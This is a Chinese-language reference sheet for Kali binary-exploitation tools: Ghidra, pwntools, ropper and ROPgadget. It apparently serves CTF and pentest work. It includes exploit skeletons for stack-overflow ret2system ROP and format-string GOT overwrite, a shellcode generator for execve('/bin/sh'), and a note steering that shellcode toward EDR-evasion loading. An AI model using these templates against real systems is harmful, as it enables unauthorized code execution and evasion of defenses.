## ghidra — NSA 开源反编译逆向平台(伪 C 恢复、跨架构)
来源:apt 包 `ghidra`(启动器 /usr/bin/ghidra,主程序 /usr/share/ghidra/ghidraRun,v12.1.3)

```bash
ghidra               # 启动图形界面(等价 /usr/share/ghidra/ghidraRun);首次运行选择 Project 工作目录
# GUI 流程:File→New Project(Non-Shared)建项目 → Import File 导入二进制 → 双击文件进 CodeBrowser
#          弹出 Auto Analyze 直接 Yes 全量分析 → 左侧 Symbol Tree 双击函数定位 → 右下 Decompile 窗口即伪 C 代码
#          常用:G 跳转地址/标号;Search 菜单搜字符串(For Strings)与函数;右键函数可重命名/加注释(同步到伪代码)
#          导出:File→Export Program 可导出反汇编/CSV;File→Export Program 可重新打包 Patch 过的二进制
```

```bash
# 无界面(headless)批量分析:脚本化/服务器上无 GUI 时使用
mkdir -p /tmp/gproj && /usr/share/ghidra/support/analyzeHeadless /tmp/gproj pwn -import ./<程序名>   # 导入并自动分析到项目
/usr/share/ghidra/support/analyzeHeadless /tmp/gproj pwn -process <程序名> -noanalysis               # 复用已分析项目做批处理(可加 -postScript 脚本)
```

参数速查(analyzeHeadless):
- `<项目目录> <项目名>` 两个位置参数:项目存储位置与名称
- `-import <文件>` 导入新二进制并自动分析
- `-process <文件名>` 对项目内已有文件执行批处理
- `-postScript <脚本>` 分析完成后执行 Ghidra 脚本(.java/.py)
- `-scriptPath <目录>` 追加脚本搜索路径
- `-noanalysis` 跳过自动分析
- `-deleteProject` 运行完删除临时项目
- `-max-cpu <n>` 限制分析并发

注意: ghidra 12 需要 JDK 21+(Kali 已带 openjdk);首次全量分析大文件较慢属正常;溢出题先 ghidra 找危险函数(strcpy/gets/read)与保护措施(可用 checksec),再回到 pwntools 写利用。

## pwntools — Python 漏洞利用框架(连接、构造 payload、调试一体化)
来源:Kali 预装 python3-pwntools(v4.15.0;`python3 -c "from pwn import *"` 即可用)

```bash
# 通用模板:交互式连接脚本(存为 exp.py)
cat > exp.py <<'EOF'
from pwn import *
context.arch = 'amd64'            # 目标架构: i386/amd64/arm/arm64,影响 p64/shellcraft
context.log_level = 'debug'       # 打印原始收发字节,排查交互问题
p = remote('<目标IP>', <端口>)     # 远程靶机
# p = process('./<程序名>')       # 本地进程(调试常用,与 remote 一键互换)
# p = gdb.debug('./<程序名>', 'b main')   # 弹出 gdb 并断在 main,边调边打
p.sendline(b'hello')              # 发送一行
p.recvuntil(b'name: ')            # 接收直到指定提示
print(p.recvline())               # 读一行回显
p.interactive()                   # 进入交互模式拿 shell(Ctrl-C 退出)
EOF
python3 exp.py                     # 运行脚本
```

```bash
# 溢出偏移定位 + shellcode 生成(一行命令)
python3 -c "from pwn import *; print(cyclic(200).decode())"        # 生成 200 字节 De Bruijn 序列,整段发给程序使其崩溃
python3 -c "from pwn import *; print(cyclic_find(0x61616168))"     # 崩溃时 EIP/RIP=0x61616168(按实际改),输出即为偏移
python3 -c "from pwn import *; context.arch='amd64'; print(asm(shellcraft.amd64.linux.sh()).hex())"  # 生成 execve('/bin/sh') shellcode 十六进制
```

```bash
# 栈溢出骨架(64 位 ret2system/ROP)
cat > exp_stack.py <<'EOF'
from pwn import *
context.arch = 'amd64'                  # 32 位改 i386,p64 换 p32
elf = ELF('./<程序名>')                 # 解析本地二进制取符号
offset = <偏移>                          # 上一步 cyclic_find 得到的值
pop_rdi = <pop_rdi地址>                  # ropper/ROPgadget 搜索得到(见下)
binsh = next(elf.search(b'/bin/sh'))    # 二进制里搜 /bin/sh 字符串地址
system = elf.sym['system']              # 有符号直接取;PIE/无符号时先 leak 再算
p = remote('<目标IP>', <端口>)           # 换 process('./<程序名>') 打本地
payload = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(system)   # mov rdi,binsh;ret 到 system;栈没对齐时前面垫一个 p64(ret地址)
p.sendlineafter(b'input:', payload)     # 按题面提示符调整
p.interactive()                         # getshell
EOF
python3 exp_stack.py
```

```bash
# 格式化字符串骨架(任意地址写)
cat > exp_fmt.py <<'EOF'
from pwn import *
elf = ELF('./<程序名>')
p = remote('<目标IP>', <端口>)
# 偏移确认:发送 AAAA-%7$p,回显 0x41414141 说明输入位于第 7 个参数
payload = fmtstr_payload(7, {elf.got['printf']: elf.sym['main']})   # 把 printf@got 改写回 main,制造循环利用
p.sendline(payload)
p.interactive()
EOF
python3 exp_fmt.py
```

参数速查(常用 API):
- `remote(ip, port)` / `process(路径)` 远程 / 本地目标,可互换
- `gdb.debug(路径, 断点)` / `gdb.attach(pid)` 动态调试
- `cyclic(n)` / `cyclic_find(值)` 溢出偏移定位
- `p32/p64` / `u32/u64` 整数打包 / 解包(小端)
- `asm()` / `disasm()` 汇编 / 反汇编
- `shellcraft.<架构>.linux.sh()` 生成 execve('/bin/sh') shellcode
- `fmtstr_payload(偏移, {地址: 值})` 格式化字符串任意写
- `ELF(路径)` 解析符号 / PLT / GOT(elf.sym / elf.plt / elf.got / elf.search)
- `ROP(elf)` 自动构建 ROP 链(rop.call / rop.system)
- `context.arch` / `context.log_level` 全局架构与日志配置

注意: `context.arch` 要在 `asm/shellcraft` 之前设置;模板里 `<偏移>`、`<pop_rdi地址>` 等占位符需按 ropper/ROPgadget 结果与 cyclic 偏移替换;真实目标先 `checksec ./<程序名>` 看 NX/PIE/RELRO 再套对应骨架。
Windows 对抗场景下,shellcraft/asm 生成的 raw shellcode 可直接作 [20-免杀与EDR对抗.md](20-免杀与EDR对抗.md) Shhhloader 的 raw 原料(加密+直接系统调用加载,工艺见 20)。

## ropper — gadget 搜索与自动 ROP 链生成
来源:apt 包 `ropper`(/usr/bin/ropper,v1.13.8)

```bash
ropper --file ./<程序名>                          # 列出二进制全部 gadgets
ropper --file ./<程序名> --search "pop rdi"      # 按正则搜索指定 gadget(64 位第一参数寄存器)
ropper --file ./<程序名> --search "jmp rsp"      # 搜 jmp/call rsp,配合栈执行 shellcode
ropper --file ./<程序名> --chain execve --nocolor # 自动生成 execve ROP 链(无色输出便于复制)
```

参数速查:
- `-f, --file <文件>` 目标二进制(可多个)
- `--search <正则>` 按正则搜 gadget(如 `pop rdi; ret`)
- `--type rop|jop|sys|all` 限定 gadget 类型
- `--chain <生成器>` 自动生成链(execve/mprotect/virtualprotect)
- `--instructions <指令>` 按指令序列过滤
- `--all` 不去重,列出全部(含重复地址)
- `--detailed` 显示 gadget 详细信息
- `-b, --badbytes <十六进制>` 过滤含坏字节的 gadget
- `--nocolor` 关闭彩色输出(管道/grep 必备)

注意: ropper 交互模式直接敲 `ropper` 进入后用 `file`/`search` 命令操作;`pop rdi; ret` 找不到时考虑 `one_gadget` 思路或改用 csu 片段;与 pwntools 的 `ROP(elf)` 互补:ropper 找素材,pwntools 拼链。

## ROPgadget — 轻量 gadget 搜索(ropchain 自动生成)
来源:apt 包 `ROPgadget`(入口 /usr/bin/ROPgadget,Python 实现)

```bash
ROPgadget --binary ./<程序名>                          # 列出全部 gadgets(带地址)
ROPgadget --binary ./<程序名> --only "pop|ret"         # 只保留含 pop/ret 的 gadget
ROPgadget --binary ./<程序名> --string "/bin/sh"       # 在可读段搜字符串地址(找 /bin/sh)
ROPgadget --binary ./<程序名> --depth 20               # gadget 最大指令字节数(默认 10,加大能找更长链)
ROPgadget --binary ./<程序名> --range 0x400000-0x402000   # 限定地址范围(排除 libc 干扰/只搜某段)
ROPgadget --binary ./<程序名> --ropchain               # 尝试自动生成完整 execve ROP 链
```

参数速查:
- `--binary <文件>` 目标二进制
- `--only "<指令|...>"` 只显示含指定指令的 gadget
- `--filter <关键字>` 反向过滤(排除含关键字的)
- `--string "<字符串>"` 搜索字符串(等价 `--string /bin/sh`)
- `--memstr "<字符串>"` 按可读内存内容搜
- `--depth <n>` 搜索深度(字节,默认 10)
- `--range <起-止>` 限定地址区间
- `--badbytes <十六进制>` 排除坏字节(如 0a)
- `--ropchain` 自动生成 ROP 链
- `--thumb` ARM thumb 模式

注意: 本机直接用 `ROPgadget` 命令即可;`python3 -m ropgadget` 在本机不可用(该包无 __main__.py 模块),不要用该方式调用;`--only "pop|ret"` 与 ropper 的 `--search` 结果可交叉验证地址;搜 libc 的 gadget 时先确认 libc 版本与加载基址(ASLR 下需运行时 leak 计算)。
